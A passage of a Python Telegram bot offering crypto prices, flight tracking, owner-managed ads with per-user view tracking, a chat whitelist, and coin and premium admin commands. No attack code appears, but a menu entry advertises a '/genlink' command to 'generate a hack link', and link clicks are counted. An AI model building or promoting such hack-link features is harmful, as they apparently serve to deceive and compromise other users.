            bot.edit_message_text("🛑 Flight tracking stopped.", call.message.chat.id, msg.message_id)
        except:
            pass

    threading.Thread(target=track_flights, daemon=True).start()

# =============================================================================
# STOP HANDLERS
# =============================================================================
@bot.callback_query_handler(func=lambda c: c.data == "stop_live")
def stop_live_callback(call):
    uid = call.from_user.id
    if uid in live_sessions:
        live_sessions[uid] = False
    bot.answer_callback_query(call.id, "Live updates stopped.")
    bot.edit_message_text("🛑 Live updates stopped.", call.message.chat.id, call.message.message_id)

@bot.callback_query_handler(func=lambda c: c.data == "stop_flight")
def stop_flight_callback(call):
    uid = call.from_user.id
    if uid in flight_sessions:
        flight_sessions[uid]["active"] = False
    bot.answer_callback_query(call.id, "Flight tracking stopped.")
    bot.edit_message_text("🛑 Flight tracking stopped.", call.message.chat.id, call.message.message_id)

# =============================================================================
# OWNER ADS MANAGEMENT
# =============================================================================
@bot.message_handler(commands=["createad"])
def createad_command(message):
    if message.from_user.id != OWNER_ID:
        bot.reply_to(message, "❌ Owner only command.")
        return
    ad_creation[message.from_user.id] = {"step": "button_text"}
    bot.send_message(message.chat.id, "📢 <b>Create New Ad</b>\n\nStep 1/4: Enter button text:")

@bot.message_handler(func=lambda m: m.from_user.id in ad_creation and ad_creation[m.from_user.id].get("step") == "button_text")
def ad_step_button(message):
    ad_creation[message.from_user.id]["button_text"] = message.text
    ad_creation[message.from_user.id]["step"] = "link"
    bot.send_message(message.chat.id, "Step 2/4: Enter ad link (URL):")

@bot.message_handler(func=lambda m: m.from_user.id in ad_creation and ad_creation[m.from_user.id].get("step") == "link")
def ad_step_link(message):
    ad_creation[message.from_user.id]["link"] = message.text
    ad_creation[message.from_user.id]["step"] = "photo"
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("⏭ Skip Photo", callback_data="ad_skip_photo"))
    bot.send_message(message.chat.id, "Step 3/4: Send a photo for the ad or skip:", reply_markup=markup)

@bot.message_handler(content_types=["photo"], func=lambda m: m.from_user.id in ad_creation and ad_creation[m.from_user.id].get("step") == "photo")
def ad_step_photo(message):
    ad_creation[message.from_user.id]["photo_id"] = message.photo[-1].file_id
    ad_creation[message.from_user.id]["step"] = "duration"
    bot.send_message(message.chat.id, "Step 4/4: Enter duration in hours:")

@bot.callback_query_handler(func=lambda c: c.data == "ad_skip_photo")
def ad_skip_photo(call):
    if call.from_user.id in ad_creation:
        ad_creation[call.from_user.id]["photo_id"] = None
        ad_creation[call.from_user.id]["step"] = "duration"
        bot.edit_message_text("Step 4/4: Enter duration in hours:", call.message.chat.id, call.message.message_id)

@bot.message_handler(func=lambda m: m.from_user.id in ad_creation and ad_creation[m.from_user.id].get("step") == "duration")
def ad_step_duration(message):
    try:
        hours = int(message.text)
    except:
        bot.reply_to(message, "❌ Enter a valid number.")
        return

    ad = ad_creation.pop(message.from_user.id)
    expires = (datetime.now() + timedelta(hours=hours)).isoformat()

    conn = get_db()
    cursor = conn.cursor()
    cursor.execute(
        "INSERT INTO ads (button_text, link, photo_id, duration_hours, expires_at) VALUES (?, ?, ?, ?, ?)",
        (ad["button_text"], ad["link"], ad.get("photo_id"), hours, expires)
    )
    ad_id = cursor.lastrowid
    conn.commit()
    conn.close()

    bot.send_message(message.chat.id, f"""
✅ <b>Ad Created!</b>
🆔 Ad ID: <b>#{ad_id}</b>
📝 Button: {ad['button_text']}
🔗 Link: {ad['link']}
📷 Photo: {'Yes' if ad.get('photo_id') else 'No'}
⏰ Duration: {hours} hours
""")

@bot.message_handler(commands=["manageads"])
def manageads_command(message):
    if message.from_user.id != OWNER_ID:
        bot.reply_to(message, "❌ Owner only command.")
        return

    conn = get_db()
    ads = conn.execute("SELECT * FROM ads WHERE active=1").fetchall()
    conn.close()

    if not ads:
        bot.send_message(message.chat.id, "📢 No active ads.")
        return

    for ad in ads:
        views = 0
        conn2 = get_db()
        v = conn2.execute("SELECT COUNT(*) as cnt FROM ad_views WHERE ad_id=?", (ad["id"],)).fetchone()
        conn2.close()
        if v:
            views = v["cnt"]

        markup = types.InlineKeyboardMarkup(row_width=3)
        markup.add(
            types.InlineKeyboardButton("⏱ Extend", callback_data=f"ad_extend_{ad['id']}"),
            types.InlineKeyboardButton("🛑 Stop", callback_data=f"ad_stop_{ad['id']}"),
            types.InlineKeyboardButton("🗑 Delete", callback_data=f"ad_delete_{ad['id']}"),
        )

        text = f"""
📢 <b>Ad #{ad['id']}</b>
📝 {ad['button_text']}
🔗 {ad['link']}
👁 Views: {views}
⏰ Expires: {ad['expires_at'][:16]}
"""
        bot.send_message(message.chat.id, text, reply_markup=markup)

@bot.callback_query_handler(func=lambda c: c.data.startswith("ad_extend_"))
def ad_extend_callback(call):
    if call.from_user.id != OWNER_ID:
        return
    ad_id = int(call.data.split("_")[2])
    conn = get_db()
    ad = conn.execute("SELECT * FROM ads WHERE id=?", (ad_id,)).fetchone()
    if ad:
        new_expires = (datetime.fromisoformat(ad["expires_at"]) + timedelta(hours=24)).isoformat()
        conn.execute("UPDATE ads SET expires_at=? WHERE id=?", (new_expires, ad_id))
        conn.commit()
        bot.answer_callback_query(call.id, "⏱ Extended by 24 hours!")
    conn.close()

@bot.callback_query_handler(func=lambda c: c.data.startswith("ad_stop_"))
def ad_stop_callback(call):
    if call.from_user.id != OWNER_ID:
        return
    ad_id = int(call.data.split("_")[2])
    conn = get_db()
    conn.execute("UPDATE ads SET active=0 WHERE id=?", (ad_id,))
    conn.commit()
    conn.close()
    bot.answer_callback_query(call.id, "🛑 Ad stopped!")

@bot.callback_query_handler(func=lambda c: c.data.startswith("ad_delete_"))
def ad_delete_callback(call):
    if call.from_user.id != OWNER_ID:
        return
    ad_id = int(call.data.split("_")[2])
    conn = get_db()
    conn.execute("DELETE FROM ads WHERE id=?", (ad_id,))
    conn.commit()
    conn.close()
    bot.answer_callback_query(call.id, "🗑 Ad deleted!")

# =============================================================================
# /informad - AD ANALYTICS (Owner only)
# =============================================================================
@bot.message_handler(commands=["informad"])
def informad_command(message):
    if message.from_user.id != OWNER_ID:
        bot.reply_to(message, "❌ Owner only command.")
        return

    conn = get_db()
    ads = conn.execute("SELECT * FROM ads").fetchall()

    if not ads:
        conn.close()
        bot.send_message(message.chat.id, "📢 No ads found.")
        return

    for ad in ads:
        views = conn.execute("""
            SELECT av.user_id, av.viewed_at, u.username, u.first_name
            FROM ad_views av
            LEFT JOIN users u ON av.user_id = u.user_id
            WHERE av.ad_id=?
            ORDER BY av.viewed_at DESC
        """, (ad["id"],)).fetchall()

        total_views = len(views)
        status = "🟢 Active" if ad["active"] else "🔴 Inactive"
        expired = "⏰ Expired" if ad["expires_at"] and ad["expires_at"] < datetime.now().isoformat() else "✅ Valid"

        text = f"""
╔══════════════════════════════════╗
║  📊 <b>AD #{ad['id']} ANALYTICS</b>
╠══════════════════════════════════╣
║  📝 Button: {ad['button_text']}
║  🔗 Link: {ad['link']}
║  📷 Photo: {'Yes' if ad['photo_id'] else 'No'}
║  {status} | {expired}
║  ⏰ Expires: {ad['expires_at'][:16] if ad['expires_at'] else 'N/A'}
║  👁 Total Views: <b>{total_views}</b>
╠══════════════════════════════════╣
║  👤 <b>VIEWERS:</b>
"""
        if views:
            for i, v in enumerate(views, 1):
                uname = f"@{v['username']}" if v['username'] else v['first_name'] or 'Unknown'
                text += f"║  {i}. {uname} (ID: <code>{v['user_id']}</code>)\n"
                text += f"║     📅 {v['viewed_at'][:16]}\n"
        else:
            text += "║  No views yet.\n"

        text += "╚══════════════════════════════════╝"
        bot.send_message(message.chat.id, text)

    conn.close()

# =============================================================================
# ADVANCED WHITELIST SYSTEM – SAB USERS KE LIYE
# =============================================================================

# ----- TRACK USER CHATS (sabse pehle yeh function, lekin handlers ke baad) -----
@bot.message_handler(func=lambda m: True)
def track_user_chats(message):
    """Track all groups/channels where user interacts (so we can list them later)"""
    # Agar message command hai to skip karo (taake commands block na hon)
    if message.text and message.text.startswith('/'):
        return
    
    if message.chat.type != 'private':
        if not hasattr(bot, 'user_chats'):
            bot.user_chats = {}
        user_id = message.from_user.id
        if user_id not in bot.user_chats:
            bot.user_chats[user_id] = []
        # Avoid duplicates
        existing = [c for c in bot.user_chats[user_id] if c['id'] == message.chat.id]
        if not existing:
            bot.user_chats[user_id].append({
                'id': message.chat.id,
                'title': message.chat.title or "Unknown"
            })

# ----- /add_whitelist – user apne channels whitelist mein add kare -----
@bot.message_handler(commands=["add_whitelist"])
def add_whitelist_start(message):
    user_id = message.from_user.id
    
    # Check if user has any chats tracked
    if not hasattr(bot, 'user_chats') or user_id not in bot.user_chats:
        bot.reply_to(message, 
            "❌ *Koi channel available nahi!*\n\n"
            "Pehle bot ko apne channel mein add karein aur kuch message bhejein.\n"
            "Phir ye command use karein.",
            parse_mode="Markdown"
        )
        return
    
    # Get all chats where bot is present and user has interacted
    all_chats = bot.user_chats[user_id]
    
    # Filter out already whitelisted
    conn = get_db()
    whitelisted_ids = [row['chat_id'] for row in conn.execute("SELECT chat_id FROM whitelist").fetchall()]
    conn.close()
    
    available = [c for c in all_chats if c['id'] not in whitelisted_ids]
    
    if not available:
        bot.reply_to(message, "✅ *Saare available channels already whitelist mein hain!*", parse_mode="Markdown")
        return
    
    # Store in user state for pagination
    user_states[f"whitelist_add_{user_id}"] = {
        'chats': available,
        'page': 0
    }
    show_whitelist_add_page(message.chat.id, user_id, 0)

def show_whitelist_add_page(chat_id, user_id, page):
    data = user_states.get(f"whitelist_add_{user_id}")
    if not data:
        return
    
    chats = data['chats']
    per_page = 5
    start = page * per_page
    end = start + per_page
    page_chats = chats[start:end]
    
    if not page_chats:
        bot.send_message(chat_id, "📭 *No more channels.*", parse_mode="Markdown")
        return
    
    total_pages = (len(chats) - 1) // per_page + 1
    text = f"╔══════════════════════════════════╗\n"
    text += f"║  📋 *ADD TO WHITELIST* (Page {page+1}/{total_pages})  ║\n"
    text += f"╠══════════════════════════════════╣\n"
    
    markup = types.InlineKeyboardMarkup(row_width=1)
    for chat in page_chats:
        text += f"║  • {chat['title'][:35]}\n"
        markup.add(types.InlineKeyboardButton(
            f"➕ Add {chat['title'][:25]}",
            callback_data=f"wl_add_{chat['id']}"
        ))
    
    text += f"╚══════════════════════════════════╝"
    
    # Navigation buttons
    nav_markup = types.InlineKeyboardMarkup(row_width=2)
    if page > 0:
        nav_markup.add(types.InlineKeyboardButton("◀️ Prev", callback_data=f"wl_add_page_{page-1}_{user_id}"))
    if end < len(chats):
        nav_markup.add(types.InlineKeyboardButton("Next ▶️", callback_data=f"wl_add_page_{page+1}_{user_id}"))
    
    bot.send_message(chat_id, text, parse_mode="Markdown", reply_markup=markup)
    if nav_markup.keyboard:
        bot.send_message(chat_id, "Navigation:", reply_markup=nav_markup)

@bot.callback_query_handler(func=lambda c: c.data.startswith('wl_add_page_'))
def whitelist_add_page_callback(call):
    parts = call.data.split('_')
    page = int(parts[3])
    user_id = int(parts[4])
    show_whitelist_add_page(call.message.chat.id, user_id, page)
    bot.answer_callback_query(call.id)

@bot.callback_query_handler(func=lambda c: c.data.startswith('wl_add_') and not c.data.startswith('wl_add_page_'))
def whitelist_add_callback(call):
    chat_id = int(call.data.split('_')[2])
    user_id = call.from_user.id
    
    try:
        chat = bot.get_chat(chat_id)
        title = chat.title or "Unknown"
        
        conn = get_db()
        conn.execute("INSERT OR REPLACE INTO whitelist (chat_id, title) VALUES (?, ?)", (chat_id, title))
        conn.commit()
        conn.close()
        
        bot.answer_callback_query(call.id, f"✅ {title} added to whitelist!")
        
        # Remove from list and refresh
        data = user_states.get(f"whitelist_add_{user_id}")
        if data:
            data['chats'] = [c for c in data['chats'] if c['id'] != chat_id]
            show_whitelist_add_page(call.message.chat.id, user_id, data['page'])
    except Exception as e:
        bot.answer_callback_query(call.id, f"❌ Error: {e}")

# ----- /remove_whitelist – user apne channels whitelist se hata sakta hai -----
@bot.message_handler(commands=["remove_whitelist"])
def remove_whitelist_start(message):
    user_id = message.from_user.id
    
    # Get all whitelisted chats
    conn = get_db()
    all_whitelist = conn.execute("SELECT * FROM whitelist").fetchall()
    conn.close()
    
    if not all_whitelist:
        bot.reply_to(message, "📋 *Whitelist is empty.*", parse_mode="Markdown")
        return
    
    # Filter to show only chats that belong to this user (based on tracked chats)
    user_chat_ids = []
    if hasattr(bot, 'user_chats') and user_id in bot.user_chats:
        user_chat_ids = [c['id'] for c in bot.user_chats[user_id]]
    
    user_whitelist = [item for item in all_whitelist if item['chat_id'] in user_chat_ids]
    
    if not user_whitelist:
        bot.reply_to(message, 
            "❌ *Aapke koi channel whitelist mein nahi hain.*\n\n"
            "Pehle /add_whitelist se koi channel add karein.",
            parse_mode="Markdown"
        )
        return
    
    # Show list in pages
    user_states[f"whitelist_remove_{user_id}"] = {
        'chats': user_whitelist,
        'page': 0
    }
    show_whitelist_remove_page(message.chat.id, user_id, 0)

def show_whitelist_remove_page(chat_id, user_id, page):
    data = user_states.get(f"whitelist_remove_{user_id}")
    if not data:
        return
    
    chats = data['chats']
    per_page = 5
    start = page * per_page
    end = start + per_page
    page_chats = chats[start:end]
    
    if not page_chats:
        bot.send_message(chat_id, "📭 *No more channels.*", parse_mode="Markdown")
        return
    
    total_pages = (len(chats) - 1) // per_page + 1
    text = f"╔══════════════════════════════════╗\n"
    text += f"║  🗑 *REMOVE FROM WHITELIST* (Page {page+1}/{total_pages})  ║\n"
    text += f"╠══════════════════════════════════╣\n"
    
    markup = types.InlineKeyboardMarkup(row_width=1)
    for chat in page_chats:
        text += f"║  • {chat['title'][:35]}\n"
        markup.add(types.InlineKeyboardButton(
            f"❌ Remove {chat['title'][:25]}",
            callback_data=f"wl_remove_{chat['chat_id']}"
        ))
    
    text += f"╚══════════════════════════════════╝"
    
    # Navigation buttons
    nav_markup = types.InlineKeyboardMarkup(row_width=2)
    if page > 0:
        nav_markup.add(types.InlineKeyboardButton("◀️ Prev", callback_data=f"wl_remove_page_{page-1}_{user_id}"))
    if end < len(chats):
        nav_markup.add(types.InlineKeyboardButton("Next ▶️", callback_data=f"wl_remove_page_{page+1}_{user_id}"))
    
    bot.send_message(chat_id, text, parse_mode="Markdown", reply_markup=markup)
    if nav_markup.keyboard:
        bot.send_message(chat_id, "Navigation:", reply_markup=nav_markup)

@bot.callback_query_handler(func=lambda c: c.data.startswith('wl_remove_page_'))
def whitelist_remove_page_callback(call):
    parts = call.data.split('_')
    page = int(parts[3])
    user_id = int(parts[4])
    show_whitelist_remove_page(call.message.chat.id, user_id, page)
    bot.answer_callback_query(call.id)

@bot.callback_query_handler(func=lambda c: c.data.startswith('wl_remove_') and not c.data.startswith('wl_remove_page_'))
def whitelist_remove_callback(call):
    chat_id = int(call.data.split('_')[2])
    user_id = call.from_user.id
    
    # Verify user owns this chat (via tracking)
    user_owns = False
    if hasattr(bot, 'user_chats') and user_id in bot.user_chats:
        user_owns = any(c['id'] == chat_id for c in bot.user_chats[user_id])
    
    if not user_owns and user_id != OWNER_ID:
        bot.answer_callback_query(call.id, "❌ Yeh channel aapka nahi hai!", show_alert=True)
        return
    
    conn = get_db()
    conn.execute("DELETE FROM whitelist WHERE chat_id=?", (chat_id,))
    conn.commit()
    conn.close()
    
    bot.answer_callback_query(call.id, "✅ Removed from whitelist!")
    
    # Refresh list
    data = user_states.get(f"whitelist_remove_{user_id}")
    if data:
        data['chats'] = [c for c in data['chats'] if c['chat_id'] != chat_id]
        show_whitelist_remove_page(call.message.chat.id, user_id, data['page'])

# ----- /list_whitelist – sab dekh sakte hain -----
@bot.message_handler(commands=["list_whitelist"])
def list_whitelist_command(message):
    conn = get_db()
    rows = conn.execute("SELECT * FROM whitelist").fetchall()
    conn.close()
    
    if not rows:
        bot.reply_to(message, "📋 *Whitelist is empty.*", parse_mode="Markdown")
        return
    
    # Get user's chats for highlighting
    user_chat_ids = []
    if hasattr(bot, 'user_chats') and message.from_user.id in bot.user_chats:
        user_chat_ids = [c['id'] for c in bot.user_chats[message.from_user.id]]
    
    text = "📋 *WHITELIST*\n\n"
    for r in rows:
        if r['chat_id'] in user_chat_ids:
            text += f"✅ {r['title']} (ID: `{r['chat_id']}`) *[Aapka]*\n"
        else:
            text += f"• {r['title']} (ID: `{r['chat_id']}`)\n"
    
    bot.send_message(message.chat.id, text, parse_mode="Markdown")

# ----- /remove_unknown_channels – user apne saare unknown channels leave kare -----
@bot.message_handler(commands=["remove_unknown_channels"])
def remove_unknown_start(message):
    user_id = message.from_user.id
    
    if not hasattr(bot, 'user_chats') or user_id not in bot.user_chats:
        bot.reply_to(message, 
            "❌ *Koi tracked channels nahi mile!*\n\n"
            "Pehle bot ko apne channel mein add karein aur kuch message bhejein.",
            parse_mode="Markdown"
        )
        return
    
    all_chats = bot.user_chats[user_id]
    
    conn = get_db()
    whitelisted_ids = [row['chat_id'] for row in conn.execute("SELECT chat_id FROM whitelist").fetchall()]
    conn.close()
    
    to_remove = [c for c in all_chats if c['id'] not in whitelisted_ids]
    
    if not to_remove:
        bot.reply_to(message, "✅ *No unknown channels found!*", parse_mode="Markdown")
        return
    
    # Ask for confirmation
    markup = types.InlineKeyboardMarkup()
    markup.add(
        types.InlineKeyboardButton("✅ Yes, leave all", callback_data=f"remove_confirm_yes_{user_id}"),
        types.InlineKeyboardButton("❌ Cancel", callback_data=f"remove_confirm_no_{user_id}")
    )
    
    text = f"⚠️ *Found {len(to_remove)} unknown channels*\n\n"
    for c in to_remove[:5]:
        text += f"• {c['title']}\n"
    if len(to_remove) > 5:
        text += f"... and {len(to_remove)-5} more\n\n"
    text += f"Do you want to leave them?"
    
    user_states[f"remove_unknown_{user_id}"] = to_remove
    bot.send_message(message.chat.id, text, reply_markup=markup, parse_mode="Markdown")

@bot.callback_query_handler(func=lambda c: c.data.startswith("remove_confirm_yes_"))
def remove_confirm_yes(call):
    user_id = int(call.data.split('_')[3])
    
    if call.from_user.id != user_id:
        bot.answer_callback_query(call.id, "❌ Yeh aapke liye nahi hai!", show_alert=True)
        return
    
    to_remove = user_states.get(f"remove_unknown_{user_id}", [])
    if not to_remove:
        bot.answer_callback_query(call.id, "❌ No channels to remove")
        return
    
    msg = bot.edit_message_text(
        "🧹 *Removing unknown channels...*",
        call.message.chat.id,
        call.message.message_id,
        parse_mode="Markdown"
    )
    
    total = len(to_remove)
    success = 0
    failed = []
    
    for i, chat in enumerate(to_remove, 1):
        try:
            # Update progress message
            progress = int((i / total) * 20)
            bar = "█" * progress + "░" * (20 - progress)
            text = f"🧹 *REMOVING UNKNOWN CHANNELS*\n"
            text += f"╔══════════════════════════════════╗\n"
            text += f"║  [{bar}] {i}/{total}\n"
            text += f"╠══════════════════════════════════╣\n"
            text += f"║  📡 Leaving: {chat['title'][:25]}\n"
            if i < total:
                text += f"║  ⏳ Next: {to_remove[i]['title'][:25]}\n"
            text += f"╚══════════════════════════════════╝"
            
            bot.edit_message_text(text, msg.chat.id, msg.message_id, parse_mode="Markdown")
            
            bot.leave_chat(chat['id'])
            success += 1
            time.sleep(1)  # Delay to avoid flood
            
        except Exception as e:
            failed.append(chat['title'])
            logger.error(f"Failed to leave {chat['title']}: {e}")
    
    # Final report
    report = f"✅ *Removal Complete*\n"
    report += f"✓ Successfully left: {success}\n"
    if failed:
        report += f"✗ Failed: {', '.join(failed[:3])}"
        if len(failed) > 3:
            report += f" and {len(failed)-3} more"
    
    bot.edit_message_text(report, msg.chat.id, msg.message_id, parse_mode="Markdown")
    user_states.pop(f"remove_unknown_{user_id}", None)

@bot.callback_query_handler(func=lambda c: c.data.startswith("remove_confirm_no_"))
def remove_confirm_no(call):
    user_id = int(call.data.split('_')[3])
    bot.edit_message_text("❌ Removal cancelled.", call.message.chat.id, call.message.message_id)
    user_states.pop(f"remove_unknown_{user_id}", None)

# ----- Auto-leave when added to non-whitelisted chat -----
@bot.message_handler(content_types=["new_chat_members"])
def on_bot_added(message):
    for member in message.new_chat_members:
        if member.id == bot.get_me().id:
            conn = get_db()
            row = conn.execute("SELECT * FROM whitelist WHERE chat_id=?", (message.chat.id,)).fetchone()
            conn.close()
            if not row:
                bot.send_message(message.chat.id, "❌ This group/channel is not whitelisted. Leaving in 2 seconds...")
                time.sleep(2)
                bot.leave_chat(message.chat.id)

# =============================================================================
# MENU CALLBACKS
# =============================================================================
@bot.callback_query_handler(func=lambda c: c.data.startswith("menu_"))
def menu_callback(call):
    section = call.data.split("_")[1]
    if section == "crypto":
        bot.answer_callback_query(call.id)
        bot.send_message(call.message.chat.id, """
📊 <b>Crypto Commands:</b>
• /btc - Bitcoin price
• /eth - Ethereum price
• /doge - Dogecoin price
• /sol /xrp /bnb /ada /dot /matic /avax
• /live - Live all crypto prices
• /price_btc - 7 day BTC chart
• /alert BTC 65000 - Set price alert
""")
    elif section == "flight":
        bot.answer_callback_query(call.id)
        bot.send_message(call.message.chat.id, "✈️ Use /nearby_flight to track aeroplanes near you!")
    elif section == "coin":
        bot.answer_callback_query(call.id)
        bot.send_message(call.message.chat.id, "💰 Use /getcoin to earn ReCOIN!\n💎 Use /balance to check your balance.")
    elif section == "premium":
        bot.answer_callback_query(call.id)
        bot.send_message(call.message.chat.id, "⭐ Use /premium to get premium features!")
    elif section == "hack":
        bot.answer_callback_query(call.id)
        bot.send_message(call.message.chat.id, "🔗 Use /genlink to generate a hack link!")

# =============================================================================
# OWNER COMMANDS (Embedded)
# =============================================================================
# Helper function for owner check
def is_owner(user_id):
    return user_id == OWNER_ID

# Command: /givecoin @username amount
@bot.message_handler(commands=['givecoin'])
def givecoin_command(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "❌ Yeh sirf owner ke liye hai.")
        return
    
    try:
        parts = message.text.split()
        if len(parts) != 3:
            bot.reply_to(message, "⚠️ Sahi format: /givecoin @username amount")
            return
        
        username = parts[1].replace('@', '')
        amount = float(parts[2])
        
        conn = get_db()
        row = conn.execute("SELECT user_id FROM users WHERE username = ? COLLATE NOCASE", (username,)).fetchone()
        if row:
            add_coins(row['user_id'], amount)
            bot.reply_to(message, f"✅ {amount} ReCOIN @{username} ko de diye gaye!")
        else:
            bot.reply_to(message, f"❌ User @{username} nahi mila.")
        conn.close()
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {e}")

# Command: /removecoin @username amount
@bot.message_handler(commands=['removecoin'])
def removecoin_command(message):
    if not is_owner(message.from_user.id):
        return
    
    try:
        parts = message.text.split()
        if len(parts) != 3:
            bot.reply_to(message, "⚠️ Sahi format: /removecoin @username amount")
            return
        
        username = parts[1].replace('@', '')
        amount = float(parts[2])
        
        conn = get_db()
        row = conn.execute("SELECT user_id FROM users WHERE username = ? COLLATE NOCASE", (username,)).fetchone()
        if row:
            conn.execute("UPDATE user_coins SET balance = balance - ? WHERE user_id = ?", (amount, row['user_id']))
            conn.commit()
            bot.reply_to(message, f"✅ {amount} ReCOIN @{username} se kaat liye gaye.")
        else:
            bot.reply_to(message, f"❌ User @{username} nahi mila.")
        conn.close()
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {e}")

# Command: /setpremium @username days
@bot.message_handler(commands=['setpremium'])
def setpremium_command(message):
    if not is_owner(message.from_user.id):
        return
    
    try:
        parts = message.text.split()
        if len(parts) != 3:
            bot.reply_to(message, "⚠️ Sahi format: /setpremium @username days")
            return
        
        username = parts[1].replace('@', '')
        days = int(parts[2])
        
        conn = get_db()
        row = conn.execute("SELECT user_id FROM users WHERE username = ? COLLATE NOCASE", (username,)).fetchone()
        if row:
            set_premium(row['user_id'], days)
            bot.reply_to(message, f"✅ @{username} ko {days} din ke liye premium bana diya gaya!")
        else:
            bot.reply_to(message, f"❌ User @{username} nahi mila.")
        conn.close()
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {e}")

# Command: /removepremium @username
@bot.message_handler(commands=['removepremium'])
def removepremium_command(message):
    if not is_owner(message.from_user.id):
        return
    
    try:
        parts = message.text.split()
        if len(parts) != 2:
            bot.reply_to(message, "⚠️ Sahi format: /removepremium @username")
            return
        
        username = parts[1].replace('@', '')
        
        conn = get_db()
        row = conn.execute("SELECT user_id FROM users WHERE username = ? COLLATE NOCASE", (username,)).fetchone()
        if row:
            conn.execute("UPDATE users SET is_premium = 0, premium_until = NULL WHERE user_id = ?", (row['user_id'],))
            conn.commit()
            bot.reply_to(message, f"✅ @{username} ka premium hata diya gaya.")
        else:
            bot.reply_to(message, f"❌ User @{username} nahi mila.")
        conn.close()
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {e}")

# Command: /block @username
@bot.message_handler(commands=['block'])
def block_user(message):
    if not is_owner(message.from_user.id):
        return
    
    try:
        parts = message.text.split()
        if len(parts) != 2:
            bot.reply_to(message, "⚠️ Sahi format: /block @username")
            return
        
        username = parts[1].replace('@', '')
        
        conn = get_db()
        # Ensure column exists (should have been added in init_db)
        try:
            conn.execute("UPDATE users SET blocked = 1 WHERE username = ? COLLATE NOCASE", (username,))
        except sqlite3.OperationalError:
            # Column nahi hai to pehle add karo
            conn.execute("ALTER TABLE users ADD COLUMN blocked INTEGER DEFAULT 0")
            conn.execute("UPDATE users SET blocked = 1 WHERE username = ? COLLATE NOCASE", (username,))
        conn.commit()
        
        if conn.total_changes > 0:
            bot.reply_to(message, f"✅ @{username} ko block kar diya gaya.")
        else:
            bot.reply_to(message, f"❌ @{username} nahi mila.")
        conn.close()
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {e}")

# Command: /unblock @username
@bot.message_handler(commands=['unblock'])
def unblock_user(message):
    if not is_owner(message.from_user.id):
        return
    
    try:
        parts = message.text.split()
        if len(parts) != 2:
            bot.reply_to(message, "⚠️ Sahi format: /unblock @username")
            return
        
        username = parts[1].replace('@', '')
        
        conn = get_db()
        conn.execute("UPDATE users SET blocked = 0 WHERE username = ? COLLATE NOCASE", (username,))
        conn.commit()
        
        if conn.total_changes > 0:
            bot.reply_to(message, f"✅ @{username} ka block hata diya gaya.")
        else:
            bot.reply_to(message, f"❌ @{username} nahi mila.")
        conn.close()
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {e}")

# Command: /ban @username (alias for block)
@bot.message_handler(commands=['ban'])
def ban_user(message):
    block_user(message)

# Command: /unban @username (alias for unblock)
@bot.message_handler(commands=['unban'])
def unban_user(message):
    unblock_user(message)

# Command: /broadcast message
@bot.message_handler(commands=['broadcast'])
def broadcast_command(message):
    if not is_owner(message.from_user.id):
        return
    
    broadcast_text = message.text.replace('/broadcast', '', 1).strip()
    if not broadcast_text:
        bot.reply_to(message, "❌ Broadcast message likho.")
        return
    
    conn = get_db()
    users = conn.execute("SELECT user_id FROM users").fetchall()
    conn.close()
    
    success = 0
    fail = 0
    for user in users:
        try:
            bot.send_message(user['user_id'], f"📢 **BROADCAST**\n\n{broadcast_text}", parse_mode="Markdown")
            success += 1
            time.sleep(0.05)
        except:
            fail += 1
    
    bot.reply_to(message, f"✅ Broadcast complete.\n✓ Sent: {success}\n✗ Failed: {fail}")

# Command: /stats
@bot.message_handler(commands=['stats'])
def stats_command(message):
    if not is_owner(message.from_user.id):
        return
    
    conn = get_db()
    total_users = conn.execute("SELECT COUNT(*) as cnt FROM users").fetchone()['cnt']
    premium_users = conn.execute("SELECT COUNT(*) as cnt FROM users WHERE is_premium=1").fetchone()['cnt']
    total_ads = conn.execute("SELECT COUNT(*) as cnt FROM ads").fetchone()['cnt']
    active_ads = conn.execute("SELECT COUNT(*) as cnt FROM ads WHERE active=1").fetchone()['cnt']
    total_links = conn.execute("SELECT COUNT(*) as cnt FROM links").fetchone()['cnt']
    total_clicks = conn.execute("SELECT SUM(clicks) as sum FROM links").fetchone()['sum'] or 0
    conn.close()
    
    stats_text = f"""
📊 **BOT STATISTICS**

👥 Total Users: {total_users}
⭐ Premium Users: {premium_users}
📢 Total Ads: {total_ads}
🟢 Active Ads: {active_ads}
🔗 Total Links: {total_links}
👁 Total Clicks: {total_clicks}
"""
    bot.send_message(message.chat.id, stats_text, parse_mode="Markdown")

# Command: /userinfo @username
@bot.message_handler(commands=['userinfo'])
def userinfo_command(message):
    if not is_owner(message.from_user.id):
        return
    
    try:
        parts = message.text.split()
        if len(parts) != 2:
            bot.reply_to(message, "⚠️ Sahi format: /userinfo @username")
            return
        
        username = parts[1].replace('@', '')
        
        conn = get_db()
        row = conn.execute("""
            SELECT u.user_id, u.username, u.first_name, u.is_premium, u.premium_until, uc.balance
            FROM users u
            LEFT JOIN user_coins uc ON u.user_id = uc.user_id
            WHERE u.username = ? COLLATE NOCASE
        """, (username,)).fetchone()
        
        if not row:
            bot.reply_to(message, f"❌ User @{username} nahi mila.")
            conn.close()
            return
        
        premium_status = "✅ Premium" if row['is_premium'] else "❌ Free"
        if row['premium_until']:
            premium_status += f" (until {row['premium_until'][:10]})"
        
        info = f"""
📋 **USER INFO**

🆔 ID: `{row['user_id']}`
👤 Username: @{row['username']}
📛 Name: {row['first_name']}
💰 Balance: {row['balance']} ReCOIN
⭐ Premium: {premium_status}
"""
        bot.send_message(message.chat.id, info, parse_mode="Markdown")
        conn.close()
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {e}")

# Command: /resetuser @username
@bot.message_handler(commands=['resetuser'])
def resetuser_command(message):
    if not is_owner(message.from_user.id):
        return
    
    try:
        parts = message.text.split()
        if len(parts) != 2:
            bot.reply_to(message, "⚠️ Sahi format: /resetuser @username")
            return
        
        username = parts[1].replace('@', '')
        
        conn = get_db()
        row = conn.execute("SELECT user_id FROM users WHERE username = ? COLLATE NOCASE", (username,)).fetchone()
        if not row:
            bot.reply_to(message, f"❌ User @{username} nahi mila.")
            conn.close()
            return
        
        user_id = row['user_id']
        conn.execute("UPDATE user_coins SET balance = 0 WHERE user_id = ?", (user_id,))
        conn.execute("UPDATE users SET is_premium = 0, premium_until = NULL WHERE user_id = ?", (user_id,))
